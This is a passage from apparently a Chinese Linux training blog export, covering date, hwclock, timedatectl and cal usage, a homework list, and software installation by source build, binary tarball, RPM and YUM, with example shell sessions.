class="line">Ctrl-l 刷新当前页，若当前文档显示情况有问题时</span><br><span class="line">Ctrl-g 取消所键入的指令</span><br></pre></td></tr></table></figure>

<h2 id="关于时间的命令"><a href="#关于时间的命令" class="headerlink" title="关于时间的命令"></a>关于时间的命令</h2><h3 id="date"><a href="#date" class="headerlink" title="date"></a>date</h3><p>date命令是显示或设置系统时间与日期。 很多shell脚本里面需要打印不同格式的时间或日期，以及要根据时间和日期执行操作。延时通常用于脚本执行过程中提供一段等待的时间。日期可以以多种格式去打印，也可以使用命令设置固定的格式。在类UNIX系统中，日期被存储为一个整数，其大小为自世界标准时间（UTC）1970年1月1日0时0分0秒起流逝的秒数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法</span><br><span class="line">date(选项)(参数)</span><br><span class="line">选项</span><br><span class="line">-d&lt;字符串&gt;：显示字符串所指的日期与时间。字符串前后必须加上双引号；</span><br><span class="line">-s&lt;字符串&gt;：根据字符串来设置日期与时间。字符串前后必须加上双引号；</span><br><span class="line"> -u：显示GMT；</span><br><span class="line">--help：在线帮助；</span><br><span class="line">--version：显示版本信息。</span><br><span class="line">参数</span><br><span class="line">&lt;+时间日期格式&gt;：指定显示时使用的日期时间格式。</span><br></pre></td></tr></table></figure>

<p>日期格式字符串列表<br>| 格式    | 说明                              |<br>| :—- | :—————————— |<br>| %H    | 小时，24小时制（00<del>23）                 |<br>| %I    | 小时，12小时制（01</del>12）                 |<br>| %k    | 小时，24小时制（0<del>23）                  |<br>| %l    | 小时，12小时制（1</del>12）                  |<br>| %M    | 分钟（00<del>59）                       |<br>| %p    | 显示出AM或PM                        |<br>| %r    | 显示时间，12小时制（hh:mm:ss %p）         |<br>| %s    | 从1970年1月1日00:00:00到目前经历的秒数      |<br>| %S    | 显示秒（00</del>59）                      |<br>| %T    | 显示时间，24小时制（hh:mm:ss）            |<br>| %X    | 显示时间的格式（%H:%M:%S）               |<br>| %Z    | 显示时区，日期域（CST）                   |<br>| %a    | 星期的简称（Sun<del>Sat）                  |<br>| %A    | 星期的全称（Sunday</del>Saturday）          |<br>| %h,%b | 月的简称（Jan<del>Dec）                   |<br>| %B    | 月的全称（January</del>December）          |<br>| %c    | 日期和时间（Tue Nov 20 14:12:58 2012） |<br>| %d    | 一个月的第几天（01<del>31）                  |<br>| %x,%D | 日期（mm/dd/yy）                    |<br>| %j    | 一年的第几天（001</del>366）                 |<br>| %m    | 月份（01<del>12）                       |<br>| %w    | 一个星期的第几天（0代表星期天）                |<br>| %W    | 一年的第几个星期（00</del>53，星期一为第一天）         |<br>| %y    | 年的最后两个数字（1999则是99）              |<br>| %Y    | 年1999                           |</p>
<h4 id="date-实验"><a href="#date-实验" class="headerlink" title="date 实验"></a>date 实验</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">格式化输出</span><br><span class="line">[booboo@rhel7 ~]$ date +"%y/%m/%d"</span><br><span class="line">16/06/16</span><br><span class="line">[booboo@rhel7 ~]$ date +"%Y/%m/%d"</span><br><span class="line">2016/06/16</span><br><span class="line">输出昨天或后天的日期</span><br><span class="line">[booboo@rhel7 ~]$ date -d "1 day ago" +"%Y-%m-%d"</span><br><span class="line">2016-06-15</span><br><span class="line">[booboo@rhel7 ~]$ date -d "-1 day" +%Y%m%d</span><br><span class="line">20160615</span><br><span class="line">[booboo@rhel7 ~]$ date -d "+1 day" +%Y%m%d</span><br><span class="line">20160617</span><br><span class="line">输出50秒后的时间</span><br><span class="line">[booboo@rhel7 ~]$ date -d "50 second" +"%Y-%m-%d %H:%M:%S"</span><br><span class="line">2016-06-16 02:52:41</span><br><span class="line">传说中的1234567890秒</span><br><span class="line">[booboo@rhel7 ~]$ date -d "1970-01-01 1234567890 seconds" +"%Y-%m-%d %H:%M:%S"</span><br><span class="line">2009-02-13 23:31:30</span><br><span class="line">2009年2月13日星期五，协调世界时（UTC）晚上11:31:30，UNIX时间将抵达1234567890秒。</span><br><span class="line">UNIX时间是UNIX或类UNIX系统使用的时间表示方式：从协调世界时1970年1月1日0时0分0秒起至现在的总秒数，不包括闰秒。由于大部分UNIX的系统都是32位，因此到2038年时间计数就可能溢出，解决方法是更换为64位模式。Linux内核开发者Alan Cox表示，Linux现在都运行64位时间模式，它可以记录到2900亿年后，因此即使太阳燃料用尽也不会出问题。</span><br><span class="line">普通格式转化</span><br><span class="line">[booboo@rhel7 ~]$ date -d "2016-06-16" +"%Y/%m/%d %H:%M:%S"</span><br><span class="line">2016/06/16 00:00:00</span><br><span class="line">设定时间需要root用户权限，此处用booboo用户模拟，没有真的修改时间</span><br><span class="line">[booboo@rhel7 ~]$ date</span><br><span class="line">Thu Jun 16 03:01:19 EDT 2016</span><br><span class="line">[booboo@rhel7 ~]$ date -s "02:03:08 2018-05-09"</span><br><span class="line">date: cannot set date: Operation not permitted</span><br><span class="line">Wed May  9 02:03:08 EDT 2018</span><br><span class="line">[booboo@rhel7 ~]$ date -s "02:03:08 20180509"</span><br><span class="line">date: cannot set date: Operation not permitted</span><br><span class="line">Wed May  9 02:03:08 EDT 2018</span><br><span class="line">[booboo@rhel7 ~]$ date -s "20180509 15:02:02"</span><br><span class="line">date: cannot set date: Operation not permitted</span><br><span class="line">Wed May  9 15:02:02 EDT 2018</span><br><span class="line">[booboo@rhel7 ~]$ date -s "2018-05-09 15:02:02"</span><br><span class="line">date: cannot set date: Operation not permitted</span><br><span class="line">Wed May  9 15:02:02 EDT 2018</span><br><span class="line">[booboo@rhel7 ~]$ date -s "2019/05/09 15:02:02"</span><br><span class="line">date: cannot set date: Operation not permitted</span><br><span class="line">Thu May  9 15:02:02 EDT 2019</span><br></pre></td></tr></table></figure>

<h4 id="date-拓展实验"><a href="#date-拓展实验" class="headerlink" title="date 拓展实验"></a>date 拓展实验</h4><p>1) 有时需要检查一组命令花费的时间 比如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping执行的时间</span><br><span class="line">[root@rhel7 ~]# vi a.sh</span><br><span class="line">[root@rhel7 ~]# cat a.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">start=$(date +%s)</span><br><span class="line">ping -c 10 172.25.0.11 &amp;&gt; /dev/null</span><br><span class="line">end=$(date +%s)</span><br><span class="line">difference=$(( $end - $start ))</span><br><span class="line">echo $difference seconds.</span><br><span class="line">[root@rhel7 ~]# bash a.sh</span><br><span class="line">9 seconds.</span><br><span class="line">sql脚本运行的是时间</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">start=$(date +%s)</span><br><span class="line"><span class="meta">$</span><span class="bash">mysql&lt; mysql.all.sql &amp;&gt; /dev/null</span></span><br><span class="line">end=$(date +%s)</span><br><span class="line">difference=$(( $end - $start ))</span><br><span class="line">echo $difference seconds.</span><br></pre></td></tr></table></figure>

<p>2) 创建以当前时间为文件名的目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# mkdir `date +%Y%m%d`</span><br><span class="line">[root@rhel7 ~]# ls</span><br><span class="line">20160616</span><br></pre></td></tr></table></figure>

<p>3）备份以时间做为文件名的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# tar -cvf `date +%Y%m%d`.tar ./`date +%Y%m%d`</span><br><span class="line">./20160616/</span><br><span class="line">[root@rhel7 ~]# ls</span><br><span class="line">20160616         Documents                         Pictures</span><br><span class="line">20160616.tar</span><br></pre></td></tr></table></figure>

<p>4）编写shell脚本计算离自己生日还有多少天？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# cat bb.sh</span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">read -p "Input your birthday(YYYYmmdd):" date1</span><br><span class="line">m=`date -d "$date1" +%m`    #得到生日的月</span><br><span class="line">d=`date -d "$date1" +%d`    #得到生日的日</span><br><span class="line">date_now=`date +%s`             #得到当前时间的秒值</span><br><span class="line">y=`date +%Y`                    #得到当前时间的年</span><br><span class="line">birth=`date -d "$y$m$d" +%s`      #得到今年的生日日期的秒值</span><br><span class="line">internal=$(($birth-$date_now))        #计算今日到生日日期的间隔时间</span><br><span class="line">if [ "$internal" -lt "0" ]; then             #判断今天的生日是否已过</span><br><span class="line">       	birth=`date --date="$(($y+1))$m$d" +%s`      #得到明年的生日日期秒值</span><br><span class="line">       	internal=$(($birth-$date_now))               #计算今天到下一个生日的间隔时间</span><br><span class="line">fi</span><br><span class="line">        echo "There is :$(($internal/60/60/24)) days."       #输出结果，秒换算为天</span><br><span class="line">Input your birthday(YYYYmmdd):19960506</span><br><span class="line">There is :323 days.</span><br><span class="line">[root@rhel7 ~]# bash bb.sh</span><br><span class="line">Input your birthday(YYYYmmdd):19960902</span><br><span class="line">There is :77 days.</span><br></pre></td></tr></table></figure>

<h3 id="hwclock"><a href="#hwclock" class="headerlink" title="hwclock"></a>hwclock</h3><p>hwclock命令是一个硬件时钟访问工具，它可以显示当前时间、设置硬件时钟的时间和设置硬件时钟为系统时间，也可设置系统时间为硬件时钟的时间。 在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。</p>
<p>查看 BIOS 时间</p>
<p>修改 BIOS 时间</p>
<p><code>hwclock --systohc</code> 将硬件时间与系统时间同步,以系统为基准</p>
<p><code>hwclock --hctosys</code> 将系统时间与硬件时间同步,以硬件为基准</p>
<h3 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h3><p>比 date 多了时区的功能</p>
<p>rhel6修改时区</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[booboo@rhel7 ~]$ tzselect</span><br><span class="line">Please identify a location so that time zone rules can be set correctly.</span><br><span class="line">Please select a continent or ocean.</span><br><span class="line"> 1) Africa</span><br><span class="line"> 2) Americas</span><br><span class="line"> 3) Antarctica</span><br><span class="line"> 4) Arctic Ocean</span><br><span class="line"> 5) Asia</span><br><span class="line"> 6) Atlantic Ocean</span><br><span class="line"> 7) Australia</span><br><span class="line"> 8) Europe</span><br><span class="line"> 9) Indian Ocean</span><br><span class="line">10) Pacific Ocean</span><br><span class="line">11) none - I want to specify the time zone using the Posix TZ format.</span><br><span class="line">\#? 5</span><br><span class="line">Please select a country.</span><br><span class="line"> 1) Afghanistan		  18) Israel		    35) Palestine</span><br><span class="line"> 2) Armenia		  19) Japan		    36) Philippines</span><br><span class="line"> 3) Azerbaijan		  20) Jordan		    37) Qatar</span><br><span class="line"> 4) Bahrain		  21) Kazakhstan	    38) Russia</span><br><span class="line"> 5) Bangladesh		  22) Korea (North)	    39) Saudi Arabia</span><br><span class="line"> 6) Bhutan		  23) Korea (South)	    40) Singapore</span><br><span class="line"> 7) Brunei		  24) Kuwait		    41) Sri Lanka</span><br><span class="line"> 8) Cambodia		  25) Kyrgyzstan	    42) Syria</span><br><span class="line"> 9) China		  26) Laos		    43) Taiwan</span><br><span class="line">10) Cyprus		  27) Lebanon		    44) Tajikistan</span><br><span class="line">11) East Timor		  28) Macau		    45) Thailand</span><br><span class="line">12) Georgia		  29) Malaysia		    46) Turkmenistan</span><br><span class="line">13) Hong Kong		  30) Mongolia		    47) United Arab Emirates</span><br><span class="line">14) India		  31) Myanmar (Burma)	    48) Uzbekistan</span><br><span class="line">15) Indonesia		  32) Nepal		    49) Vietnam</span><br><span class="line">16) Iran		  33) Oman		    50) Yemen</span><br><span class="line">17) Iraq		  34) Pakistan</span><br><span class="line">\#? 9</span><br><span class="line">Please select one of the following time zone regions.</span><br><span class="line">1) east China - Beijing, Guangdong, Shanghai, etc.</span><br><span class="line">2) Heilongjiang (except Mohe), Jilin</span><br><span class="line">3) central China - Sichuan, Yunnan, Guangxi, Shaanxi, Guizhou, etc.</span><br><span class="line">4) most of Tibet &amp; Xinjiang</span><br><span class="line">5) west Tibet &amp; Xinjiang</span><br><span class="line">\#? 1</span><br><span class="line"></span><br><span class="line">The following information has been given:</span><br><span class="line"></span><br><span class="line">	China</span><br><span class="line">	east China - Beijing, Guangdong, Shanghai, etc.</span><br><span class="line"></span><br><span class="line">Therefore TZ='Asia/Shanghai' will be used.</span><br><span class="line">Local time is now:	Thu Jun 16 15:08:57 CST 2016.</span><br><span class="line">Universal Time is now:	Thu Jun 16 07:08:57 UTC 2016.</span><br><span class="line">Is the above information OK?</span><br><span class="line">1) Yes</span><br><span class="line">2) No</span><br><span class="line">\#? 1</span><br><span class="line"></span><br><span class="line">You can make this change permanent for yourself by appending the line</span><br><span class="line">	TZ='Asia/Shanghai'; export TZ</span><br><span class="line">to the file '.profile' in your home directory; then log out and log in again.</span><br><span class="line"></span><br><span class="line">Here is that TZ value again, this time on standard output so that you</span><br><span class="line">can use the /bin/tzselect command in shell scripts:</span><br><span class="line">Asia/Shanghai</span><br></pre></td></tr></table></figure>

<p>rhel7 版本</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[kiosk@foundation0 Desktop]$ timedatectl</span><br><span class="line">      Local time: Wed 2016-06-15 16:47:40 CST</span><br><span class="line">  Universal time: Wed 2016-06-15 08:47:40 UTC</span><br><span class="line">        RTC time: Wed 2016-06-15 16:47:40</span><br><span class="line">       Time zone: Asia/Shanghai (CST, +0800)</span><br><span class="line">     NTP enabled: yes</span><br><span class="line">NTP synchronized: yes</span><br><span class="line"> RTC in local TZ: yes</span><br><span class="line">      DST active: n/a</span><br></pre></td></tr></table></figure>

<p>关键词：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">UTC	协调世界时 Coordinated Universal Time</span><br><span class="line">	又称世界统一时间，世界标准时间，国际协调时间。1972 年1 月1日，UTC（协调世界时）成为新的世界标准时间。</span><br><span class="line">CST	时区缩写</span><br><span class="line">	CST可以为如下4个不同的时区的缩写：</span><br><span class="line">　　	美国中部时间：Central Standard Time (USA) UT-6:00</span><br><span class="line">	澳大利亚中部时间：Central Standard Time (Australia) UT+9:30</span><br><span class="line">	中国标准时间：China Standard Time UT+8:00 例如，UTC是0点，那么CST中国为早晨8点</span><br><span class="line">	古巴标准时间：Cuba Standard Time UT-4:00</span><br><span class="line">RTC Time</span><br><span class="line">	硬件时钟时间</span><br><span class="line">	set-local-rtc 1 本地时区</span><br><span class="line">	set-local-rtc 0	UTC</span><br><span class="line">DST	Daylight Saving Time日光节约时间、夏令时</span><br><span class="line">	是一种为节约能源而人为规定地方时间的制度，在这一制度实行期间所采用的统一时间称为“夏令时间”。</span><br><span class="line">	一般在天亮早的夏季人为将时间提前一小时，可以使人早起早睡，减少照明量，以充分利用光照资源，从而节约照明用电。</span><br><span class="line">	各个采纳夏时制的国家具体规定不同。目前全世界有近110个国家每年要实行夏令时。</span><br><span class="line">	1986年至1991年，中国在全国范围实行了六年夏令时，1992年4月5日后不再实行。</span><br></pre></td></tr></table></figure>

<h3 id="cal"><a href="#cal" class="headerlink" title="cal"></a>cal</h3><p>cal命令用于显示当前日历，或者指定日期的日历。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cal [-smjy13] [[[day] month] year]</span><br><span class="line">-1 显示当月日历并将今日标黑</span><br><span class="line">-3 显示上个月、当月、下个月。</span><br><span class="line">-s 周日作为第一列</span><br><span class="line">-m 周一作为第一列</span><br><span class="line">-j 列出今天是一年的第几天</span><br><span class="line">-y 列出今年所有的月</span><br><span class="line">[root@rhel7 ~]# cal</span><br><span class="line">      June 2016     </span><br><span class="line">Su Mo Tu We Th Fr Sa</span><br><span class="line">          1  2  3  4</span><br><span class="line"> 5  6  7  8  9 10 11</span><br><span class="line">12 13 14 15 16 17 18</span><br><span class="line">19 20 21 22 23 24 25</span><br><span class="line">26 27 28 29 30</span><br><span class="line"></span><br><span class="line">[root@rhel7 ~]# cal -3</span><br><span class="line">      May 2016              June 2016             July 2016     </span><br><span class="line">Su Mo Tu We Th Fr Sa  Su Mo Tu We Th Fr Sa  Su Mo Tu We Th Fr Sa</span><br><span class="line"> 1  2  3  4  5  6  7            1  2  3  4                  1  2</span><br><span class="line"> 8  9 10 11 12 13 14   5  6  7  8  9 10 11   3  4  5  6  7  8  9</span><br><span class="line">15 16 17 18 19 20 21  12 13 14 15 16 17 18  10 11 12 13 14 15 16</span><br><span class="line">22 23 24 25 26 27 28  19 20 21 22 23 24 25  17 18 19 20 21 22 23</span><br><span class="line">29 30 31              26 27 28 29 30        24 25 26 27 28 29 30</span><br><span class="line">                                            31                  </span><br><span class="line">[root@rhel7 ~]# cal -j</span><br><span class="line">         June 2016         </span><br><span class="line">Sun Mon Tue Wed Thu Fri Sat</span><br><span class="line">            153 154 155 156</span><br><span class="line">157 158 159 160 161 162 163</span><br><span class="line">164 165 166 167 168 169 170</span><br><span class="line">171 172 173 174 175 176 177</span><br><span class="line">178 179 180 181 182</span><br></pre></td></tr></table></figure>

<h2 id="Linux-基础命令作业"><a href="#Linux-基础命令作业" class="headerlink" title="Linux 基础命令作业"></a>Linux 基础命令作业</h2><ol>
<li>在/tmp 目录下创建 testdir 目录,在该目录下创建 file1 到 file30 的 30 个文件。</li>
<li>删除所有以 file1 起始的文件。</li>
<li>删除 file2 后匹配一个字符的所有文件。</li>
<li>在/home/student 目录下递归创建一个/home/student/a/b/c/d/e 目 录,并且将该 a 目录保留原属性的复制到/tmp 目录下。</li>
<li>将/tmp 下的 a 目录重命名为 test 目录。</li>
<li>统计一下/etc/passwd 文件总共有几行。</li>
<li>在/tmp 下创建一个目录,目录名为 study</li>
<li>在 study 目录下创建一个文件, 文件名任意, 并向这个文件里写 hello 字段</li>
<li>往该文件里追加 study 字段。</li>
<li>查看该文件内容。</li>
<li>统计一下该文件共有几行,几个单词,几个字节。</li>
<li>将/etc/passwd 里以 bash 结尾的行过滤出来,并从中截取第一列字<br>段内容。</li>
<li>统计/boot/下所有文件的属性中含 root 字段的文件共有几个。</li>
<li>熟悉一下 vim 编辑器,利用 vim 编辑器书写整理一下今天所学的 知识点。</li>
<li>判断一下 boot 目录下文件的内容类型,并将属于 ASCII 码文件内容 类型的文件名显示到屏幕上</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 软件安装</title>
    <url>/2016/12/22/booboo_linux_base/05-Linux%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h2 id="源代码安装"><a href="#源代码安装" class="headerlink" title="源代码安装"></a>源代码安装</h2><ul>
<li>优势 : 可定制，紧跟发布，及时修正Bug</li>
<li>缺点 : 操作复杂 , 编译时间长 , 极易出现错误，大面积部署复杂且低效，安全性隐患大</li>
</ul>
<h3 id="源代码安装步骤"><a href="#源代码安装步骤" class="headerlink" title="源代码安装步骤"></a>源代码安装步骤</h3><ul>
<li>下载解压,阅读软件包附带的 install 文件和 readme 文件,获取软件的相关信息。</li>
<li>进入解包之后的目录,执行 “ ./configure” 命令，使用参数设置编译环境和编译模块，例如<code>--prefix</code>为编译做好关于本地环境的配置。</li>
<li>配置成功后,执行 “ make” 命令进行软件编译。</li>
<li>编译成功后,执行 “ make install” 命令完成安装。</li>
<li>最后,执行 “ make clean” 命令删除安装时产生的临时文件</li>
</ul>
<h3 id="卸载步骤"><a href="#卸载步骤" class="headerlink" title="卸载步骤"></a>卸载步骤</h3><ul>
<li>先进入软件的安装目录,然后执行卸载命令即可:<code>make uninstall</code></li>
<li>如果有的软件包不提供 uninstall 功能,则必须进行手动删除。因此你需要阅读安装目录里面的readme 文件,或者在安装的过程中指定安装目录,即在 ./configure 命令后面添加参数 –prefix ,例如:<code>./configure --prefix=/usr/local/dir</code></li>
<li>该命令将把软件安装在 /usr/local/ 路径的 dir 目录里。通常情况下,大多数软件都默认安装在 /usr/local 目录里。</li>
</ul>
<h3 id="MPlayer源码安装实验"><a href="#MPlayer源码安装实验" class="headerlink" title="MPlayer源码安装实验"></a>MPlayer源码安装实验</h3><blockquote>
<p>下载软件包到系统某个目录下，本次演示中使用/tmp/mplayer/目录，软件包包括主程序、库函数、皮肤</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget ....</span><br><span class="line">all-20071007.tar.bz2	库函数</span><br><span class="line">Blue-1.7.tar.bz2	皮肤</span><br><span class="line">MPlayer-1.0rc2.tar.bz2	主程序</span><br></pre></td></tr></table></figure>

<blockquote>
<p>将压缩包解压</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -jxf</span><br></pre></td></tr></table></figure>

<blockquote>
<p>创建目录用来存放库函数</p>
</blockquote>
<p><code>mkdir  /usr/local/lib/codes</code></p>
<blockquote>
<p>将/tmp/mplayer/all/目录下所有文件复制到/usr/local/lib/codes</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp all-20071007/* /usr/local/lib/codes</span><br><span class="line">ll /usr/local/lib/codes</span><br></pre></td></tr></table></figure>

<blockquote>
<p>安装依赖包</p>
</blockquote>
<p><code>yum install -y kernel-devel gcc  zlib-devel  gtk2-devel</code></p>
<blockquote>
<p>检查安装环境</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /tmp/mplayer/MPlayer-1.0rc2</span><br><span class="line">./configure --enable-gui --codecsdir=/usr/local/lib/codes --enable-x11  --enable-xshape  --language=zh_CN --disable-ivtv --disable-png</span><br></pre></td></tr></table></figure>

<blockquote>
<p>编译make</p>
</blockquote>
<p><code>make</code></p>
<blockquote>
<p>安装</p>
</blockquote>
<p><code>make install</code></p>
<blockquote>
<p>装皮肤</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">这部分不是代码，而是程序装在了哪里</span><br><span class="line">  Install prefix: /usr/local</span><br><span class="line">  Data directory: /usr/local/share/mplayer</span><br><span class="line">  Config direct.: /usr/local/etc/mplayer</span><br></pre></td></tr></table></figure>

<ul>
<li>创建目录<code>mkdir /usr/local/share/mplayer/skins/default/</code></li>
<li>将皮肤文件复制到/usr/local/share/mplayer/default/目录中<br><code>cp /tmp/mplayer/Blue/* /usr/local/share/mplayer/skins/default/</code></li>
</ul>
<blockquote>
<p>从真机桌面用鼠标双击打开图形化界面的rhel6，去测试，是否安装成功。</p>
</blockquote>
<p><code>applications---&gt;sound&amp;video----&gt;mplayer</code></p>
<hr>
<h2 id="二进制安装"><a href="#二进制安装" class="headerlink" title="二进制安装"></a>二进制安装</h2><p>直接解压缩即可使用</p>
<p>例如 mycat 数据库代理服务器<br>安装 mycat ,直接解压缩即可使用</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar xf Mycat-server-1.5.1-RELEASE-20160328130228-linux.tar.gz -C /usr/local</span><br><span class="line">cd /usr/local;ls</span><br><span class="line">cd mycat;ll</span><br><span class="line">chmod 755 * -R</span><br><span class="line">vim conf/schema.xml</span><br><span class="line">vim conf/server.xml</span><br><span class="line">bin/mycat start</span><br></pre></td></tr></table></figure>

<h2 id="RPM"><a href="#RPM" class="headerlink" title="RPM"></a>RPM</h2><p>RPM : redhat package management</p>
<p>rpm 命令是 RPM 软件包的管理工具。 rpm 原本是 Red Hat Linux 发行版专门用来管理 Linux 各项套件的程序,由于它遵循 GPL 规则且功能强大方便,因而广受欢迎。逐渐受到其他发行版的采用。 RPM 套件管理方式的出现,让 Linux 易于安装,升级,间接提升了 Linux 的适用度。</p>
<p>rpm 的命名规范 : 软件名 - 版本号 - 操作系统平台</p>
<p>libreoffice4.1-calc-4.1.6.2-1.x86_64.rpm</p>
<p>zlib-1.2.3-29.el6.x86_64.rpm</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 rpm ( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">-a :查询所有套件;</span><br><span class="line">-b&lt; 完成阶段 &gt;&lt; 套件档 &gt;+ 或 -t &lt; 完成阶段 &gt;&lt; 套件档 &gt;+ :设置包装套件的完成阶段,并指定套件档的文件名称;</span><br><span class="line">-c :只列出组态配置文件,本参数需配合 "-l" 参数使用;</span><br><span class="line">-d :只列出文本文件,本参数需配合 "-l" 参数使用;</span><br><span class="line">-e&lt; 套件档 &gt; 或 --erase&lt; 套件档 &gt; :删除指定的套件;</span><br><span class="line">-f&lt; 文件 &gt;+ :查询拥有指定文件的套件;</span><br><span class="line">-h 或 --hash :套件安装时列出标记;</span><br><span class="line">-i :显示套件的相关信息;</span><br><span class="line">-i&lt; 套件档 &gt; 或 --install&lt; 套件档 &gt; :安装指定的套件档;</span><br><span class="line">-l :显示套件的文件列表;</span><br><span class="line">-p&lt; 套件档 &gt;+ :查询指定的 RPM 套件档;</span><br><span class="line">-q :使用询问模式,当遇到任何问题时, rpm 指令会先询问用户;</span><br><span class="line">-R :显示套件的关联性信息;</span><br><span class="line">-s :显示文件状态,本参数需配合 "-l" 参数使用;</span><br><span class="line">-U&lt; 套件档 &gt; 或 --upgrade&lt; 套件档 &gt; :升级指定的套件档;</span><br><span class="line">-v :显示指令执行过程;</span><br><span class="line">-vv :详细显示指令执行过程,便于排错。</span><br><span class="line"></span><br><span class="line">参数 软件包:指定要操纵的 rpm 软件包。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">install 安装</span><br><span class="line">1)rpm -ivh [x.rpm] 安装 v\h 显示安装过程中的进度条 verbose\hash</span><br><span class="line">query 查询</span><br><span class="line">2)rpm -q [ 软件名称 ] 查看软件是否安装</span><br><span class="line">3)rpm -qi [ 软件名称 ] 查看软件的详细信息</span><br><span class="line">4)rpm -ql [ 软件名称 ] 查看软件在系统中安装过的文件</span><br><span class="line">5)rpm -qf [ 文件名称 ] 查看文件是由哪个软件包安装出来的</span><br><span class="line">6)rpm -qa 查看系统里所有已经安装过的软件包</span><br><span class="line">卸载 remove</span><br><span class="line">6)rpm -e [ 软件名称 ] 卸载软件</span><br><span class="line">rpm -e --nodeps 不卸载依赖关系</span><br><span class="line">update 升级</span><br><span class="line">7)rpm -U [ 软件名称 ] 升级 , 若没有该软件则安装</span><br><span class="line">8)rpm -F [ 软件名称 ] 升级 , 若没有该软件则不安装</span><br></pre></td></tr></table></figure>


<h2 id="YUM"><a href="#YUM" class="headerlink" title="YUM"></a>YUM</h2><h3 id="yum-的作用"><a href="#yum-的作用" class="headerlink" title="yum 的作用"></a>yum 的作用</h3><p>作用 : 为了解决包之间的依赖关系而存在的一种管理机制 , 基于 rpm 为前端的包管理机制 .<br>为了解决依赖关系 , 引入了一种仓库的机制 .</p>
<h3 id="yum-仓库"><a href="#yum-仓库" class="headerlink" title="yum 仓库"></a>yum 仓库</h3><p>仓库 : 用来存放软件和软件之间的依赖关系 , 当我们需要安装软件的时候 , 就可以通过该依赖关系 , 来将相应的依赖包都装上 .repodata 目录就是 yum 的仓库 , 存放软件和软件之间的依赖关系数据 .</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 dvd]# ll repodata/ -d</span><br><span class="line">dr-xr-xr-x. 2 root root 4096 Nov 12</span><br><span class="line">[root@rhel6 dvd]#pwd</span><br><span class="line">/mnt/rhel6.5/x86_64/dvd</span><br></pre></td></tr></table></figure>

<h3 id="依赖关系"><a href="#依赖关系" class="headerlink" title="依赖关系"></a>依赖关系</h3><p>安装系统的光盘中已经有建号的依赖关系了,即 repodata/ 目录,如果要自己手动制作 rpm 包依赖关系目录,该怎么做呢?</p>
<h4 id="安装软件-createrepo"><a href="#安装软件-createrepo" class="headerlink" title="安装软件 createrepo"></a>安装软件 createrepo</h4><p>rhel7 默认已经安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel7 ~]# yum install -y createrepo</span><br><span class="line">Loaded plugins: langpacks, product-id, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager</span><br><span class="line">to register.</span><br><span class="line">server</span><br><span class="line">| 4.1 kB 00:00:00</span><br><span class="line">(1/2): server/group_gz</span><br><span class="line">| 134 kB 00:00:00</span><br><span class="line">(2/2): server/primary_db</span><br><span class="line">| 3.4 MB 00:00:00</span><br><span class="line">Package createrepo-0.9.9-23.el7.noarch already installed and latest version</span><br><span class="line">Nothing to do</span><br></pre></td></tr></table></figure>
<p>rhel6 要自己安装</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rhel6 rc.d]# yum install -y createrepo</span><br><span class="line">Loaded plugins: product-id, refresh-packagekit, security, subscription-manager</span><br><span class="line">This system is not registered to Red Hat Subscription Management. You can use subscription-manager</span><br><span class="line">to register.</span><br><span class="line">server</span><br><span class="line">Running Transaction</span><br><span class="line">Installing : deltarpm-3.5-0.5.20090913git.el6.x86_64</span><br><span class="line">1/3</span><br><span class="line">Installing : python-deltarpm-3.5-0.5.20090913git.el6.x86_64</span><br><span class="line">2/3</span><br><span class="line">Installing : createrepo-0.9.9-18.el6.noarch</span><br><span class="line">3/3</span><br><span class="line">Verifying : createrepo-0.9.9-18.el6.noarch</span><br><span class="line">1/3</span><br><span class="line">Verifying : python-deltarpm-3.5-0.5.20090913git.el6.x86_64</span><br><span class="line">2/3</span><br><span class="line">Verifying : deltarpm-3.5-0.5.20090913git.el6.x86_64</span><br><span class="line">3/3</span><br><span class="line">Installed:</span><br><span class="line">createrepo.noarch 0:0.9.9-18.el6</span><br><span class="line">Dependency Installed:</span><br><span class="line">deltarpm.x86_64 0:3.5-0.5.20090913git.el6</span><br><span 